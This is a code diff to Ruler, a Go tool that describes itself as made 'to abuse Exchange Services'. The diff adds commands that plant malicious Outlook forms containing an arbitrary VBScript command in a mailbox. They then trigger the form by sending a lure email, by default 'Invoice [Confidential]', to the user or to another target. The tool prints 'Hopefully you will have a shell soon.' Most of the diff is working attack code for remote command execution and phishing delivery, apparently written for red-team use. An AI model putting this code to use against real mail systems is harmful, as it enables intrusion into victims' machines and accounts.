@@ -14,6 +14,7 @@ import (
 
 	"github.com/howeyc/gopass"
 	"github.com/sensepost/ruler/autodiscover"
+	"github.com/sensepost/ruler/forms"
 	"github.com/sensepost/ruler/mapi"
 	"github.com/sensepost/ruler/utils"
 	"github.com/urfave/cli"
@@ -155,6 +156,8 @@ func displayRules(c *cli.Context) error {
 	return er
 }
 
+//sendMessage sends a message to the user, using their own Account
+//uses supplied subject and body
 func sendMessage(subject, body string) error {
 
 	propertyTags := make([]mapi.PropertyTag, 1)
@@ -207,7 +210,7 @@ func connect(c *cli.Context) error {
 	config.Insecure = c.GlobalBool("insecure")
 	config.Verbose = c.GlobalBool("verbose")
 	config.Admin = c.GlobalBool("admin")
-	config.RPCEncrypt = c.GlobalBool("encrypt")
+	config.RPCEncrypt = !c.GlobalBool("noencrypt")
 	config.CookieJar, _ = cookiejar.New(nil)
 
 	//add supplied cookie to the cookie jar
@@ -299,7 +302,7 @@ func connect(c *cli.Context) error {
 
 		if mapiURL == "" { //try RPC
 			//fmt.Println("No MAPI URL found. Trying RPC/HTTP")
-			resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
+			resp, _, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 			if err != nil {
 				exit(err)
 			}
@@ -323,7 +326,7 @@ func connect(c *cli.Context) error {
 
 	} else {
 		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
-		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
+		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCNtlm, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 		if err != nil {
 			exit(err)
 		}
@@ -474,12 +477,98 @@ func abkDump(c *cli.Context) error {
 	return nil
 }
 
+func createForm(c *cli.Context) error {
+	//first check that supplied command is valid
+	var command string
+	if c.String("input") != "" {
+		cmd, err := utils.ReadFile(c.String("input"))
+		if err != nil {
+			return err
+		}
+		command = string(cmd)
+	} else {
+		command = c.String("command")
+	}
+
+	if len(command) > 4096 {
+		return fmt.Errorf("Command is too large. Maximum command size is 4096 characters.")
+	}
+
+	suffix := c.String("suffix")
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+
+	msgid, err := forms.CreateFormMessage(suffix)
+	if err != nil {
+		return err
+	}
+
+	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
+		return err
+	}
+	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
+		return err
+	}
+
+	//trigger the email if the send option is enabled
+	if c.Bool("send") == true {
+		return triggerForm(c)
+	}
+	return nil
+}
+
+func triggerForm(c *cli.Context) error {
+	subject := c.String("subject")
+	body := c.String("body")
+	suffix := c.String("suffix")
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+	target := c.GlobalString("email")
+
+	utils.Trace.Println("Creating Trigger message.")
+	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
+	if err != nil {
+		return err
+	}
+	utils.Info.Println("Sending email.")
+	//send to another account
+	if c.String("target") != "" {
+		target = c.String("target")
+	}
+
+	if _, err = mapi.SendExistingMessage(folderid, msgid, target); err != nil {
+		return err
+	}
+	utils.Info.Println("Email sent! Hopefully you will have a shell soon.")
+	return nil
+}
+
+func deleteForm(c *cli.Context) error {
+	suffix := c.String("suffix")
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+
+	if _, err := forms.DeleteForm(suffix, folderid); err != nil {
+		utils.Error.Println("Failed to delete form.")
+		return err
+	}
+	utils.Info.Println("Form deleted successfully.")
+	return nil
+}
+
+func displayForms(c *cli.Context) error {
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+
+	if err := forms.DisplayForms(folderid); err != nil {
+		utils.Error.Println("Failed to find any forms.")
+		return err
+	}
+	return nil
+}
+
 func main() {
 
 	app := cli.NewApp()
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
-	app.Version = "2.0.17"
+	app.Version = "2.1.0"
 	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
 	app.Description = `         _
  _ __ _   _| | ___ _ __
@@ -534,8 +623,8 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Usage: "Ignore server SSL certificate errors",
 		},
 		cli.BoolFlag{
-			Name:  "encrypt",
-			Usage: "Use NTLM auth on the RPC level - some environments require this",
+			Name:  "noencrypt",
+			Usage: "Don't use encryption the RPC level - some environments require this",
 		},
 		cli.BoolFlag{
 			Name:  "basic,b",
@@ -804,21 +893,147 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			},
 		},
 		{
-			Name:    "troopers",
-			Aliases: []string{"t"},
-			Usage:   "Troopers",
-			Action: func(c *cli.Context) error {
-				utils.Info.Println("Ruler - Troopers 17 Edition")
-				st := `.___________..______        ______     ______   .______    _______ .______          _______.
-|           ||   _  \      /  __  \   /  __  \  |   _  \  |   ____||   _  \        /       |
- ---|  |----|   |_)  |    |  |  |  | |  |  |  | |  |_)  | |  |__   |  |_)  |      |   (----
-    |  |     |      /     |  |  |  | |  |  |  | |   ___/  |   __|  |      /        \   \
-    |  |     |  |\  \----.|   --'  | |   --'  | |  |      |  |____ |  |\  \----.----)   |
-    |__|     | _| ._____|  \______/   \______/  | _|      |_______|| _| ._____|_______/
+			Name:  "form",
+			Usage: "Interact with the forms function.",
+			Subcommands: []cli.Command{
+				{
+					Name:  "add",
+					Usage: "creates a new form. ",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix",
+							Value: "pew",
+							Usage: "A 3 character suffix for the form. Defaults to pew",
+						},
+						cli.StringFlag{
+							Name:  "command,c",
+							Value: "",
+							Usage: "The command to execute.",
+						},
+						cli.StringFlag{
+							Name:  "input,i",
+							Value: "",
+							Usage: "A path to a file containing the command to execute. This takes precidence over 'command'",
+						},
+						cli.BoolFlag{
+							Name:  "send,s",
+							Usage: "Trigger the form once it's been created.",
+						},
+						cli.StringFlag{
+							Name:  "body,b",
+							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
+							Usage: "The email body you may wish to use",
+						},
+						cli.StringFlag{
+							Name:  "subject",
+							Value: "Invoice [Confidential]",
+							Usage: "The subject you wish to use, this should contain your trigger word.",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is needs to be set.", 1)
+						}
+						if c.String("command") == "" && c.String("input") == "" {
+							utils.Error.Println("Please supply a valid command.\nSample:\nCreateObject(\"WScript.Shell\").Run \"calc.exe\", 0, False")
+							return cli.NewExitError("No command supplied", 1)
+						}
 
-		https://www.troopers.de/troopers17/`
-				utils.Info.Println(st)
-				return nil
+						err := connect(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						err = createForm(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						return nil
+					},
+				},
+				{
+					Name:  "send",
+					Usage: "send an email to an existing form and trigger it",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix,s",
+							Value: "",
+							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
+						},
+						cli.StringFlag{
+							Name:  "body,b",
+							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
+							Usage: "The email body you may wish to use",
+						},
+						cli.StringFlag{
+							Name:  "subject",
+							Value: "Invoice [Confidential]",
+							Usage: "The subject you wish to use, this should contain your trigger word.",
+						},
+						cli.StringFlag{
+							Name:  "target",
+							Value: "",
+							Usage: "Send the email to another account.",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
+						}
+
+						err := connect(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						err = triggerForm(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						return nil
+					},
+				},
+				{
+					Name:  "delete",
+					Usage: "delete an existing form",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix,s",
+							Value: "",
+							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
+						}
+
+						err := connect(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						err = deleteForm(c)
+						if err != nil {
+							exit(err)
+						}
+						return nil
+					},
+				},
+				{
+					Name:  "display",
+					Usage: "display all existing forms",
+
+					Action: func(c *cli.Context) error {
+
+						err := connect(c)
+						if err != nil {
+							return cli.NewExitError(err, 1)
+						}
+						err = displayForms(c)
+						if err != nil {
+							exit(err)
+						}
+						return nil
+					},
+				},
 			},
 		},
 	}
